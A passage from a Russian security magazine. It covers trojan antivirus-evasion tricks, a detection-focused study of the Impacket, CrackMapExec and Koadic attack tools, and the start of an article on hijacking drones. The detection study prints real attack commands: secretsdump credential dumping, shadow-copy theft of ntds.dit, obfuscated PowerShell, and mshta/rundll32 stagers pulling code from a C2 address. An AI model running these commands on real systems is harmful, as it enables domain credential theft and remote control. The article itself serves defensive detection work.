варианты:  так,  троян,  известный  под именем  Trojan.VkBase.73,  менял
параметры загрузки Windows, уста навливал в системе спе циальную службу,
которая при перезагрузке системы в безопас ном режиме удаляла установ‐
ленные на компьютере антивирусы. Затем тро ян размещал в области уведом‐
лений панели задач зна чок соответс твующего антивирусного приложения,
которое было ранее им удалено. В результате пользователь даже не догады‐
вается, что его компьютер больше не имеет антивирусной защиты. После
успешного удаления антивиру са защиты на экран выводится сообщение
на русском или английском языке (в зависимос ти от версии антивирусного
ПО и локали ОС) следующего содержания: «Внимание! Антивирус [наз вание
антивируса] работает в режиме усиленной защиты. Это временная мера,
необходимая для моментального реагирования на угрозы со стороны вирус‐
ных программ. От вас не требуется никаких действий». Данное сообщение
демонстрируется для того, чтобы пользователь не забеспокоился, обна‐
ружив, что значок антивирусной программы в области уведомлений панели
задач Windows больше не реагирует на щел чки мышью.
  Для обхода песоч ницы некоторые вирусы или тро яны име ют специальные
«механизмы замедления», которые «при тормаживают» вредоносную функци‐
ональность приложения или «усыпляют» ее на некоторый срок, активизируя
деструктивные функции по истечении определенного времени. Это позволя‐
ет усыпить бдительность защитной программы, которая, запус тив приложе‐
ние в песочнице и убе дившись в его безопас ности, дает ему «зеленый свет».
Например, один из сов ременных троянцев исполь зует такой механизм обхо‐
да автоматизированных систем анализа: соз дает во временной папке файл,
в которой миллион раз записывает по одному бай ту, а потом мил лион раз
читает из него так же по одно му байту. В результате таких безобидных дли‐
тельных циклических действий процеду ра поведенческого анализа завер‐
шается раньше, чем троянец начина ет реализовывать свои основные фун‐
кции.


ПОСЛЕСЛОВИЕ
Алгоритмы детектирования вредоносного ПО, так же как и методы борьбы
с антивирусами, совершенству ются с каждым днем. Однако уникальные алго‐
ритмы обхода антивирусной защиты появляются край не редко — как правило,
вирмейкеры используют стандартные и давно проверенные на практике
методики. Разработчики защитных программ, хорошо знающие все эти
методики, часто оказываются на полшага впереди вирусописателей. Именно
поэтому антивирусная защита все еще остается довольно эффективным
методом борьбы с вредоносными и потенциаль но опасными программами —
особенно для неопытных пользователей.
ВЗЛОМ
 ПОЙМАТЬ
  НАРУШИТЕЛЯ!

       УЧИМСЯ ДЕТЕКТИРОВАТЬ
         ИНСТРУМЕНТЫ АТАК
            НА WINDOWS





                                           Антон Тюрин
                                              Руководитель отдела
                                          экспертных сервисов PT Ex‐
                                                  pert Security Center, Positive
                                                      Technologies
                                                  atyurin@ptsecurity.com





                                          Егор Подмоков
                                            Эксперт, PT Expert Security
                                                Center, Positive Technologies





Атаки на Windows в наше время одна из наиболее реальных
угроз для компаний. При этом исходный код используемых
хакерами инс трументов открыт и доступен на GitHub. В этой
статье мы поговорим о том, какие существуют средства раз‐
вития  атаки  внутри  инфраструктуры,  и о  том,  как  их
эффективно детектировать.


В 2017–2018 годах группировки APT Dragonﬂy, APT28 и APT MuddyWater про‐
водили атаки на правительственные и военные орга низации Европы, Север‐
ной Америки и Саудовской Ара вии. И использовали для этого три инстру мен‐
та — Impacket, CrackMapExec и Koadic.
  Перечисленные средства применя ются на раз ных стадиях атаки, которые
следуют после преодоления периметра. На этих эта пах детектировать мал‐
варь уже непросто. Для этого нужно либо выявлять следы компрометации
в сетевом трафике, либо применять инстру менты для обнаруже ния активных
действий злоумышленника.
  В Impacket, CrackMapExec и Koadic реализова но множество интерес ных
функций — от передачи файлов до взаимодействия с реес тром и выполнения
команд на удаленной машине. Мы исследова ли эти инструменты с целью
определить их сетевую активность. Вот какие задачи мы перед собой ставили
в рамках исследования.
 • По нять, как работает хакерский инстру мен тарий. Узнать, что нуж‐
   но атакующим для эксплуата ции и какими технологиями они могут вос‐
   пользоваться.
 • Найти то, что не детек тиру ется средствами информацион ной
  безопасности на первых стадиях атаки. Стадия разведки может
   быть пропущена — либо потому, что ата кующим выс тупает внутренний
   злоумышленник, либо потому, что ата кующий пользуется такой брешью
   в инфраструктуре, о которой не было известно ранее. Появляется воз‐
   можность восстановить всю цепочку его действий, отсюда возникает
   желание обнаруживать дальнейшее передвижение.
 • Устранить лож ные срабаты вания средств обнаруже ния втор-
  жений. Нельзя забывать и о том, что при обна руже нии тех или иных дей‐
   ствий на основе одной только разведки воз можны частые ошибки. Сущес‐
   твует множество  спо собов замаскировать  активность  вредоносного
  ПО под легитимные дей ствия.

Итак, что конкретно дела ют перечисленные инстру менты? В слу чае с Impacket
злоумышленники получают большую биб лиотеку модулей, которые можно
использовать на разных ста диях атаки, следующих после преодоления
периметра. Мно гие инс тру менты используют модули Impacket у себя внут‐
ри — например, Metasploit. В нем имеются утилиты dcomexec и wmiexec
для удаленного выполнения команд, secretsdump для получения из памяти
учетных записей, которые добавлены из Impacket. В итоге правильное обна‐
ружение активности  такой библиотеки обес печит и обнаруже ние про‐
изводных.
  О CrackMapExec (или прос то CME) создатели нес лучайно написали Pow‐
ered by Impacket. Помимо его функций, в CME входят средства для реали‐
зации популярных сценариев: это и BloodHound, и Mimikatz для получения
паролей или их хешей, и внедрение Meterpreter либо Empire agent для удален‐
ного исполнения.
   Третий выбранный нами инстру мент — Koadic. Он дос таточно свеж, был
представ лен на DEF CON 25 в 2017 году и отличается нес тандартным под‐
ходом: работой через HTTP, JavaScript и VBScript. Такой подход называют liv‐
ing oﬀ the land: инструмент пользует ся набором зависимос тей и библиотек,
встроенных в Windows. Создатели называ ют его COM Сommand & Сontrol,
или С3.


IMPACKET
Функциональность Impacket весьма широка, начиная от раз ведки внутри AD
и сбора данных с внутренних серверов MS SQL и заканчивая техниками
для получения учетных данных: это и атака SMB Relay, и получение с контрол‐
лера домена файла ntds.dit, содержащего хеши паролей пользователей. Так‐
же Impacket удаленно выполняет команды четырьмя разными способами:
через WMI, сервис для управления планировщиком Windows, DCOM и SMB.
И для этого ему нужны учет ные данные.


Secretsdump
В качестве цели для модуля secretsdump могут выступать как машины поль‐
зователей, так и контроллеры домена. С его помощью можно получать копии
областей памяти LSA, SAM, SECURITY, NTDS.dit, поэтому его можно увидеть
на разных стадиях атаки.
  Первый шаг в работе это го модуля — аутентификация через SMB,
для которой необходим либо пароль пользователя, либо его хеш для авто‐
матического проведения ата ки Pass the Hash. Далее идет запрос на открытие
доступа к Service Control Manager (SCM) и получение доступа к реестру
по протоколу winreg, используя который ата кующий может узнать данные
интересующих его веток и получить результаты через SMB.
  На картинке ниже мы видим, как именно при использовании протокола
winreg происходит получение дос тупа по ключу реестра с LSA. Для этого
используется команда DCERPC с opcode 15 — OpenKey.





             Открытие ключа реестра по протоколу winreg

Далее, когда доступ по клю чу получен, зна чения сохраняются командой
SaveKey с opcode 20. Impacket делает это весь ма специфично. Он сохраня ет
значения в файл, имя которого — это строка из вось ми случайных символов
с добавлением .tmp. Кроме того, дальнейшая выгрузка этого файла происхо‐
дит через SMB из директории System32.





          Схе ма получения ключа реес тра с уда лен ной машины

Выходит, обнаружить такую активность в сети можно благодаря запросам
к определенным веткам реестра по протоколу winreg, специфичным име нам,
командам и их порядку.
   Также этот модуль оставляет следы в журнале событий Windows, благода‐
ря которым он легко обна руживается. Например, попробуй выполнить коман‐
ду


secretsdump.py ‐debug ‐system SYSTEM ‐sam SAM ‐ntds NTDS ‐security
SECURITY ‐bootkey BOOTKEY ‐outputfile 1.txt ‐use‐vss ‐exec‐method
mmcexec ‐user‐status ‐dc‐ip 192.168.202.100 ‐target‐ip 192.168.202.
100 contoso/Administrator:@DC

В результате в журнале Windows Server 2016 появит ся следующая ключевая
последовательность событий.
 1. 4624 — удаленный Logon.
 2. 5145 — проверка прав дос тупа к удален ному сервису winreg.
 3. 5145 — проверка прав дос тупа к файлу в директории System32. Файл
  имеет случайное имя по описанному выше принципу.
 4. 4688 — создание процесса cmd.exe, который запускает vssadmin:


   "C:\windows\system32\cmd.exe" /Q /c echo c:\windows\system32\cmd.
   exe /C vssadmin list shadows ^> %SYSTEMROOT%\Temp\__output >
   %TEMP%\execute.bat & C:\windows\system32\cmd.exe /Q /c %TEMP%\
   execute.bat & del %TEMP%\execute.bat

 5. 4688 — создание процесса с командой


   "C:\windows\system32\cmd.exe" /Q /c echo c:\windows\system32\cmd.
   exe /C vssadmin create shadow /For=C: ^> %SYSTEMROOT%\Temp\
   __output > %TEMP%\execute.bat & C:\windows\system32\cmd.exe /Q /c
   %TEMP%\execute.bat & del %TEMP%\execute.bat

 6. 4688 — создание процесса с командой


   "C:\windows\system32\cmd.exe" /Q /c echo c:\windows\system32\cmd.
   exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\
   Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^> %SYSTEM
   ROOT%\Temp\__output > %TEMP%\execute.bat & C:\windows\system32\
   cmd.exe /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat

 7. 4688 — создание процесса с командой


   "C:\windows\system32\cmd.exe" /Q /c echo c:\windows\system32\cmd.
   exe /C vssadmin delete shadows /For=C: /Quiet ^> %SYSTEMROOT%\
   Temp\__output > %TEMP%\execute.bat & C:\windows\system32\cmd.exe /
   Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat


Smbexec
Как и у многих инструментов для пос тэкс плуатации, у Impacket есть модули
для удаленного выполнения команд. Мы оста новимся на smbexec, который
дает инте рактивную командную обо лочку на уда ленной машине. Для этого
модуля также требуется аутентифика ция через SMB либо паролем, либо его
хешем. На скриншоте ниже ты можешь наб людать пример работы такого инс‐
трумента, в данном случае это консоль локального админис тратора.





                 Ин терактивная консоль smbexec

Первый этап smbexec пос ле аутентифика ции — это откры тие SCM командой
OpenSCManagerW (15). Запрос примеча телен: в нем поле MachineName име‐
ет значение DUMMY.





              Запрос на открытие Service Control Manager

Далее создается сервис с помощью команды CreateServiceW (12). В слу‐
чае smbexec мы можем видеть каждый раз одинаковую логику построения
команды. На скриншоте ниже зеленым цветом отме чены неизменяемые
параметры команды, желтым — то, что атакующий может изменить. Нетрудно
заметить, что имя исполняемого файла, его директорию и файл output изме‐
нить можно, но оставшееся поменять куда сложнее, не нарушая логику
работы модуля Impacket.





     Запрос на создание сервиса с помощью Service Control Manager

Smbexec также оставляет явные следы в журнале событий Windows. В жур‐
нале Windows Server 2016 для интерактивной командной оболочки с коман‐
дой ipconfig увидим следующую ключевую последовательность событий:
 1. 4697 — установка сервиса на машине жертвы:


   %COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 >
   %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del
   %TEMP%\execute.bat

 2. 4688 — создание процесса cmd.exe с аргу ментами из пункта 1.
 3. 5145 — проверка прав дос тупа к фай лу __output в директории C$.
 4. 4697 — установка сервиса на машине жертвы.


   %COMSPEC% /Q /c echo ipconfig ^> \\127.0.0.1\C$\__output 2^>^&1 >
   %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del
   %TEMP%\execute.bat

 5. 4688 — создание процесса cmd.exe с аргу ментами из пункта 4.
 6. 5145 — проверка прав дос тупа к фай лу __output в директории C$.

На Impacket основаны многие инс тру менты для атак. Он поддерживает почти
все протоколы Windows и при этом имеет свои характерные особенности.
Здесь и конкрет ные запросы winreg, и использование SCM API с характерным
формированием команд, и формат имен фай лов, и SMB share с наз ванием
SYSTEM32.


CRACKMAPEXEC
Инструмент CME призван в первую очередь автоматизировать те рутинные
действия, которые атакующий выполняет для продвижения внутри сети. Он
позволяет работать в связке с небезызвес тными Empire agent и Meterpreter.
Чтобы выполнять команды скрытно, CME может их обфусци ровать. Используя
BloodHound (отдельный инс трумент для проведения разведки), атакующий
может автоматизировать поиск активной сессии доменного администратора.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          ПОЙМАТЬ
       НАРУШИТЕЛЯ!
            УЧИМСЯ ДЕТЕКТИРОВАТЬ ИНСТРУМЕНТЫ
                                 АТАК НА WINDOWS





BloodHound
BloodHound как самостоятельный инстру мент позволяет вести продвинутую
разведку внутри сети. Он собирает данные о пользователях, машинах, груп‐
пах, сессиях и поставляется в виде скрип та на PowerShell или бинарного фай‐
ла.
  Для сбора информации используются LDAP или протоколы на основе
SMB.  Интеграционный  модуль CME  поз воляет  загружать  BloodHound
на машину жертвы, запус кать и получать соб ранные данные после выпол‐
нения, тем самым авто матизируя действия в сис теме и делая их менее
заметными.
   Графическая оболочка BloodHound представляет собранные данные
в виде графов, что позволяет найти кратчайший путь от машины атакующего
до доменного администра тора.





                    Ин терфейс BloodHound

Для запуска на машине жертвы модуль соз дает задачу, используя ATSVC
и SMB. ATSVC — это интерфейс для работы с пла нировщиком задач Windows.
CME использует его функцию NetrJobAdd (1) для создания задач по сети.
Пример  того, что отправляет модуль CME, показан на картинке ниже:
это вызов команды cmd.exe и обфусци рованный код в виде аргументов
в формате XML.





                   Создание задачи через CME

После того как задача поступила на исполнение, машина жертвы запускает
сам BloodHound, и в тра фике это мож но увидеть. Для модуля характерны
LDAP‐запросы для получения стандартных групп, списка всех машин и поль‐
зователей в домене, получение информа ции об активных пользовательских
сессиях через запрос SRVSVC NetSessEnum.





           Получение списка активных сессий через SMB

Кроме того, запуск BloodHound на машине жертвы с включенным ауди том
сопровождается событием с ID 4688 (соз дание процесса) и именем процес‐
са C:\Windows\System32\cmd.exe. Примечательны в нем аргументы коман‐
дной строки:


cmd.exe /Q /c powershell.exe ‐exec bypass ‐noni ‐nop ‐w 1 ‐C " & (
$eNV:cOmSPEc[4,26,25]‐JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 ,
101 , … , 40,41 )‐jOIN'' ) "


Enum_avproducts
Весьма интересен с точки зрения функциональ ности и реализации модуль
enum_avproducts. WMI поз воля ет с помощью языка запросов WQL получать
данные объектов Windows, чем, по сути, и поль зуется этот модуль CME. Он
генерирует запросы к клас сам AntiSpywareProduct и AntiМirusProduct,
собирая данные о средствах защиты, уста новленных на машине жертвы. Что‐
бы получить нужную информа цию, модуль выполняет подключение к прос‐
транству  имен  root\SecurityCenter2,  затем формирует  WQL‐запрос
и получает ответ. Ниже показа но содержимое таких запросов и отве тов.
В нашем примере нашелся Windows Defender.





            Сетевая активность модуля enum_avproducts

Зачастую аудит WMI (Trace WMI‐Activity), в событиях которого можно найти
полезную информацию о WQL‐запросах, может оказаться выключенным.
Но если он включен, то в случае запуска сценария enum_avproducts сохранит‐
ся событие с ID 11. В нем будет содержаться имя пользователя, который
отправил запрос, и имя в прос транстве имен root\SecurityCenter2.
   У каждого из модулей CME обна ружились свои артефакты. Это и специфи‐
ческие WQL‐зап росы, и создание определен ного вида задачи в Task Sched‐
uler с обфускацией, и характерная для BloodHound активность в LDAP и SMB.


KOADIC
Отличительная особен ность Koadic — это исполь зование встроенных в Win‐
dows интерпретаторов JavaScript и VBScript. В этом смыс ле он сле дует тренду
living oﬀ the land — то есть не имеет внешних зависимостей и пользуется стан‐
дартными средствами Windows.
   Это инструмент для пол ноценного Command & Control (C&C), поскольку
после заражения на машину устанавлива ется «имплант», позволя ющий ее
контролировать. Такая машина в терминологии Koadic называется «зомби».
При нехватке привиле гий для полноценной работы на стороне жертвы Koadic
может их поднять, используя техники обхода контроля учетных записей (UAC
bypass).





                    Командная оболочка Koadic

Жертва должна сама иницииро вать общение с сервером Command & Control.
Для этого ей необ ходимо обратиться по заранее подготовленному URI
и получить основное тело Koadic с помощью одного из стейдже ров. Ниже
показан пример для стейджера MSHTA.





              Инициализация сес сии с сервером C&C

По переменной WS из ответа становится понятно, что исполнение происходит
через WScript.Shell, а переменные STAGER, SESSIONKEY, JOBKEY, JOBKEY‐
PATH, EXPIRE содержат ключевую информа цию о параметрах текущей сессии.
Это первая пара запрос‐ответ в HTTP‐соединении с сервером C&C. Пос‐
ледующие запросы связаны непос редственно с функциями вызываемых
модулей (имплантов). Все модули Koadic работа ют только с активной сес‐
сией c C&C.


Mimikatz
Так же как CME работа ет с BloodHound, Koadic работает с Mimikatz как с
отдельной программой и может запускать ее нес колькими способами. Ниже
представ лена пара запрос‐ответ для загрузки импланта Mimikatz.





                   Переда ча Mimikatz в Koadic

Можно заметить, как изменился формат URI в запросе. В нем появилось зна‐
чение у перемен ной csrf, которая отвечает за выб ранный модуль. Не обра‐
щай внимания на ее название: все мы зна ем, что под CSRF обычно понимают
другое. В ответ пришло все то же основное тело Koadic, в которое добавился
код, связанный с Mimikatz. Он объемный, поэтому рассмотрим ключевые
моменты.
  Перед нами закодированная в Base64 биб лиотека Mimikatz, сери али‐
зованный  .NET‐класс,  который  будет  ее  инжектировать,  и  аргументы
для запуска Mimikatz. Результат выполнения передается по сети в открытом
виде.





          Результат выполнения Mimikatz на уда лен ной машине


Exec_cmd
В Koadic есть и модули, способные удален но выполнять команды. Здесь мы
увидим все тот же метод генерации URI и зна комые переменные sid и csrf.
В случае модуля exec_cmd в тело добавляется код, который способен выпол‐
нять команды shell. Ниже показан такой код, содержащийся в HTTP‐ответе
C&C‐сервера.





                      Код импланта exec_cmd

Переменная GAWTUUGCFI со зна комым атрибутом WS необходима для выпол‐
нения кода. С ее помощью имплант вызывает шелл, обрабаты вая две ветки
кода — shell.exec с возвра щением выходного потока данных и shell.run
без возращения.
   Koadic — нетипич ный инстру мент, но имеет свои артефакты, по которым
его можно найти в легитимном тра фике:
 • особое формирование HTTP‐запросов,
 • использование winHttpRequests API,
 • создание объекта WScript.Shell через ActiveXObject,
 • большое исполняемое тело.

Изначальное соединение инициирует стейджер, поэтому появляется воз‐
можность обнаруживать его активность через события Windows. Для MSHTA
это событие 4688, которое говорит о соз дании процесса с атрибутом запус‐
ка:


C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6

Во время выполнения Koadic можно уви деть и дру гие события 4688 с атри‐
бутами, которые отлично его характеризу ют:


rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fb
a83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication
rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405
690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\
mshtml,RunHTMLApplication
"C:\Windows\system32\cmd.exe" /q /c chcp 437 & net session 1> C:\
Users\user02\AppData\Local\Temp\6dc91b53‐ddef‐2357‐4457‐04a3c333db06.
txt 2>&1
"C:\Windows\system32\cmd.exe" /q /c chcp 437 & ipconfig 1> C:\Users\
user02\AppData\Local\Temp\721d2d0a‐890f‐9549‐96bd‐875a495689b7.txt 2>
&1


ВЫВОДЫ
Злоумышленники нын че широко используют для своих нужд встроенные
в Windows инструменты и механизмы. Мы видим, как популярные инструменты
Koadic, CrackMapExec и Impacket, следующие принципу living oﬀ the land, все
чаще встречаются в отчетах об APT. Число форков на GitHub у этих инс тру‐
ментов тоже растет — сейчас их уже око ло тысячи.
   Этот тренд набирает популярность из‐за его простоты: злоумышленни кам
не нужны сторонние инстру менты, они уже есть на машинах жертв и помогают
обходить средства защиты.
  Мы в Positive Technologies сос редоточены на изу чении сетевого взаимо‐
действия: каждый описанный выше инстру мент  оставляет свои  следы
в сетевом трафике; подробное их исследова ние позволило нам научить наш
продукт PT Network Attack Discovery их обна ружи вать, что в итоге помогает
распутать всю цепочку киберинцидентов с их участием.
ВЗЛОМ


  УГНАТЬ
  ДРОН

            МЕТОДЫ
             ПЕРЕХВАТА
            УПРАВЛЕНИЯ
            КОПТЕРАМИ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru





Одновременно с развитием интернета вещей эволюци они руют и методы
взлома умных девайсов. Уже сейчас существу ет целый зоопарк троянов
для IoT, но одними толь ко роутерами, телеприставками и IP‐виде окамерами
ассортимент интеллек туальных устройств отнюдь не исчерпы вается. Особый
интерес с точки зрения информационной безопасности представляют дро‐
ны — научиться управлять чужим летательным аппаратом мечтают многие.
Имеются ли способы «угона» коптеров? Сей час раз беремся!


К ИСТОРИИ ВОПРОСА
На борьбу c беспилотниками, а также на меры, регулирующие их исполь‐
зование населе нием, государства ежегодно тратят миллионы дол ларов,
правда без особого успеха. На слуху недавний слу чай, когда работа британ‐
ского аэропорта Гатвик была на несколько дней парализована невесть откуда
взявшимися коптерами, для уничтожения которых пра вительство даже вынуж‐
дено было прив лекать снайперов. Что уж говорить о чиновниках, которым
не дают покоя снующие над их поместь ями дро ны с виде окамерами, так
и норовящие сунуть свой назойливый объектив в чужую час тную жизнь. Эх,
если бы существовал надеж ный спо соб перехвата управле ния беспилот‐
никами, заветная мечта многих государс твенных деяте лей стала бы реаль‐
ностью. Или такой способ все же существует?
   Если бы все было так прос то, как кажется, пра вительственные чиновники
не изобретали бы хит роумные способы борь бы с летающей электронной
нечистью вроде тренировки охотничь их соколов, разработки вооруженных
сетями дронов‐перехватчиков и соз дания прочих электромагнитных пушек.
Но если посмотреть на проблему с инженерной точки зре ния, любой коп‐
тер — это по большому счету электронное устройство с дис танционным
управлением, а значит, радиока нал, по которому передаются управляющие
команды, теоретически может быть скомпрометирован. Вопрос  только
в сложности достижения этой цели, однако, как говорится, нет таких кре пос‐
тей, которые неспособ на взять Красная армия.





Для начала предлагаю отделить двукрылых насекомых от мясных блюд
из жареного фарша. Когда речь идет о копеечных игрушках с «АлиЭкс прес‐
са», в пультах которых не применя ется авториза ция при соединении с при‐
емником, «перехват» не представляет осо бой технической сложности. Если
сразу после включения питания коптера или присоединения к нему акку муля‐
тора, в момент, когда на бес пилотнике быстро мигает светодиодный инди‐
катор и устройство находится в режиме поиска передатчика, первым вклю‐
чить поблизости аналогичный трансмиттер (при использовании «универсаль‐
ных» пультов еще придется нажать на кнопку Bind), то дрон с высокой долей
вероятности «подцепит ся» именно к нему и «потеряет» оригинальный. А вот
если мы говорим о более‐менее серь езной технике, то тут дело обстоит нам‐
ного сложнее.


ПОД КАПОТОМ
Многие летательные аппараты с дистанционным управлением (равно как и
радиоуправляемые игрушки) используют для обмена данными протокол
DSM2/DSMX, при этом в качестве рас простра ненной альтернативы можно
назвать технологию SLT. DSM применя ется в широко полосных передатчиках
с частотой 2,4 ГГц и считается хорошо защищенным от случайных помех
в радиоканале. Этот протокол позволяет сохранять данные полета в файл
журнала, при этом DSM2 поддерживает функцию обнаружения отключения
сигнала (например, при сбое питания), а DSMX — нет, но оба этих стандарта
совместимы. Протокол SLT работа ет на той же частоте и совместим с тран‐
смиттерами различных производителей, но «родное» для него железо —
устройства производства компаний Tactic и Hitec.
  Еще  один  протокол,  поддерживаемый  некоторыми  бес пилотными
летательными аппаратами, носит наименование MAVlink, он часто задейству‐
ется для передачи телеметрии. MAVlink имеет откры тый исходный код, реали‐
зован в виде модуля Python и распространяется под лицензией LGPL. Этот
протокол по умол чанию не применя ет шифрование при обмене данными
и поэто му теоре тически более уязвим к ата кам по сравнению с конкуриру‐
ющими технологиями, где такая функция имеется.
   Ряд коптеров, которыми можно управлять с любого современного смар‐
тфона,  использует  в  качестве среды переда чи  данных беспроводную
сеть 802.11 с WEP‐шифрованием. О безопас ности Wi‐Fi писалось уже много
и весьма подробно, так что нет смысла повторяться. Взлом такой сети можно
назвать рутинной процеду рой, арсенал имеющихся для этого технических
средств весьма обширен.
  А теперь от обще го перейдем к частному.


УГНАТЬ ЗА ШЕСТЬДЕСЯТ СЕКУНД
В первую очередь погово рим о дронах, работа ющих по беспроводной сети.
Почему создатели коптеров решили использовать в качестве алгоритма шиф‐
рования неустой чивый  к взлому WEP вместо более распространенного
WPA/WPA2 — тайна, покрытая мра ком, но, веро ятнее всего, это как‐то свя‐
зано со скоростью передачи и обработки данных оборудованием летатель‐
ного аппарата. Одно дело, если вдруг начнет лагать локальная сеть, и совсем
другое — если сбойнет канал свя зи с дроном, летящим на высоте десяти
метров над чужим огородом. Пос ледствия будут совершенно раз ными.





Как и любое другое подоб ное устройство, коптер с Wi‐Fi на борту оборудован
сетевым адаптером, имеющим MAC‐адрес, по которому его можно иден‐
тифицировать. Так работают, например, летатель ные аппараты Parrot. Смар‐
тфон с уста новленным приложением служит в этом слу чае аналогом пульта
управления, с которо го дрон и получа ет команды.
  Для идентификации управляющего устройства используется ID Key — уни‐
кальная метка, «привязанная» к уста новленно му на смартфоне приложению
(Flight control software) и текущей сессии. Принцип взлома прост: атакующий
подклю чается к сети дрона, определяет уникальную метку, после чего отправ‐
ляет коптеру команду, которая зас тавит его отклю читься от текущего управля‐
ющего устройства и начать прием команд со смартфона злоумышленника,
имеющих «скопированную» метку оригинального устройства.
  На практике для взло ма сети беспилотников использовалось приложение
Aircrack‐ng. Программа умеет монито рить эфир в поисках защищенных сетей
Wi‐Fi, перехватывать пакеты и экспортировать из них данные для пос леду‐
ющего анализа, а также применять различные алгоритмы сетевых атак. Под‐
робнее ее функции описаны на сайте производителя.
  Однако просто взло мать сеть недостаточно, нужно еще перехватить
передаваемые между дро ном и оператором данные. Пример реализации
такого перехвата продемонс трировал парень по имени Сэми Камкар (Samy
Kamkar), собрав для этих целей специальный девайс на основе одноплатного
компьютера Raspberry Pi и записав свои эксперименты на видео. Суть его
метода вкратце такова.
   Чувак использовал Raspberry Pi с воткнутым в его USB‐порт Wi‐Fi‐донглом
и внешний адап тер Alfa AWUS036H, с помощью которого он, собственно,
и взламывал сеть. Одноплат ник был запитан от батареи через Micro USB
и использовался в качестве сканера, прощупывающего эфир и определя‐
ющего MAC‐адре са подключенных к беспроводным сетям устройств. Фишка
заключается в том, что все коптеры про изводс тва компании Parrot используют
схожие MAC‐адреса из одно го бло ка, сведения о котором можно найти в пуб‐
личных источниках. Проверив адрес на соответствие этому диапазону, можно
безошибочно определить, что перед нами именно беспилотник Parrot, а не
какая‐нибудь умная хлеборез ка или скороварка с сетевым интерфейсом.
  В упомянутом видео использовался клиент node‐ar‐drone, написанный
на Node.js и предназначенный для работы с коптерами Parrot AR Drone 2.0.
Исходники этой библиотеки можно найти на GitHub. Node‐ar‐drone позволяет
взаимодействовать с дро нами Parrot при помощи команд JavaScript: менять
направле ние и высоту полета, получать видеопо ток или снимки с камеры коп‐
тера, а также делать с ним дру гие забавные вещи.
  Сэми Камкар присобачил Raspberry  Pi на собс твенный квадрокоптер
и запустил его в поисках дру гих дронов Parrot. Обна ружив сеть такого бес‐
пилотника, наш исследователь взламывал ее с использованием Aircrack‐ng,
устанавливал соединение с «вражеским» дроном, а затем при помощи node‐
ar‐drone перехватывал поступающий с коптера видеопоток. Таким образом
он мог видеть все, что попадало в поле зрения камеры «взломанного» бес‐
пилотника, но управление полетом дрона в этом эксперименте реализовано
не было.





Перехват управле ния квадрокоптером Syma примерно схожим образом
реализовали ребята из Positive Technologies, о чем был снят поз навательный
видеосюжет. Базовая идея тут была заложена та же самая: Raspberry Pi
в качестве сканера каналов, поз воляющего отследить работающие поб‐
лизости трансмиттеры и перехватить уникальный идентификатор пульта бес‐
пилотника. Именно на проверке это го идентифика тора и строится вся сис‐
тема безопасности протокола управления, используемого коптерами Syma.
Если этот идентификатор вбить в программу, эму лиру ющую работу пульта, ты
получишь возможность управлять беспилотником.
  После запуска эмулятора, присоединенного к ВЧ‐передатчику сигнала,
дрон оказывается подключен одновременно к двум пультам управле ния: нас‐
тоящему, который находится в руках у RC‐пилота, и поддельному, при этом
аппарат откликается на команды с обоих пуль тов. Суть хака заключается
в том, что работающая на пульте зло умышленника программа может отсы лать
дрону управляющие команды вдвое чаще оригиналь ного пульта. Если опе‐
ратор, например, отдаст коптеру команду сни жаться, то от злоумышленника
в ту же дискретную единицу времени может пос тупить две команды уве личить
обороты. Беспилотник послушно обработает их все, но результирующим дей‐
ствием будет набор высоты, пос кольку таких директив поступило больше.
Используя  эту  нехитрую особенность выполнения команд по очереди,
похититель может увести дрон за пределы зоны действия оригинального
пульта управления и бла гополучно посадить его в соседнем лесочке.


БОЛЬШИЕ ИГРУШКИ
В предыдущем разделе речь шла о недорогих и довольно простых по конс‐
трукции летательных аппаратах. А как нас чет «серь езной» техники, исполь‐
зующей шифрование, или беспилотников, которые передают данные по про‐
токолам DSM2/DSMX или SLT без всяких смартфонов? Можно ли перехватить
управление, скажем, продукцией DJI?
   Тут, как любят говорить некоторые девушки, все сложно. Во‐первых, про‐
изводители стараются шифроваться не толь ко в прямом смысле, но и
в переносном, например стирают маркировку со смонтированных в приемни‐
ках и передатчиках микросхем, хотя зна токам и так прекрасно известно, какие
чипы там используются. Во‐вторых, даже несмотря на то, что все подобные
трансмиттеры работают с конкретным набором час тот, частота сменяется
автоматически с интервалом в две миллисекунды, то есть каждую секунду
коптер переходит с одной частоты на дру гую при мерно 500 раз. В‐третьих,
все передаваемые по управляющему каналу команды смешиваются с псев‐
дослучайными данными, поэтому, даже «услышав» в эфире сигнал такого
беспилотника, подменить его будет очень непросто.
   То есть в теории это, конечно, возможно: нужно сдампить прошивку дрона,
дизассемблировать ее, выяс нить алго ритм, по которому происходит сме на
частот и генерация цифрового «шума», пос ле чего написать эму лятор… Мож‐
но еще использовать уяз вимости в протоколах, если таковые удастся обна‐
ружить. Наиболее перспективен с этой точки зрения протокол MAVlink, пос‐
кольку для него доступны исходники (за исклю чением проприетарных ком‐
понентов) и целый ворох документации. Только вот затраты сил и нервов
в этом случае могут быть несо измеримы с полученным результатом.





Если основная задача — не украсть коп тер, а просто предотвратить его полет
над определенной географичес кой точкой, спецслужбы уже давно исполь‐
зуют более простые методы ее решения вроде GPS‐спуфинга. Применением
именно этой  тех нологии объясняется феномен перенаправления поль‐
зователей GPS‐навигаторов в аэропорт Шереметьево, когда те оказываются
вблизи Крем ля. Используемые для GPS‐спу финга устройства глу шат сигнал
навигационных спутников и передают в эфир собс твенный сигнал, трансли‐
рующий на принимающее устройство ложные координаты. Из‐за этого
устройство считает, будто оно находится в районе ближайшего аэропорта.
Расчет делается на то, что в прошивку большинс тва дронов заложен запрет
на полеты над гражданскими воз душны ми гаваня ми — при приближении
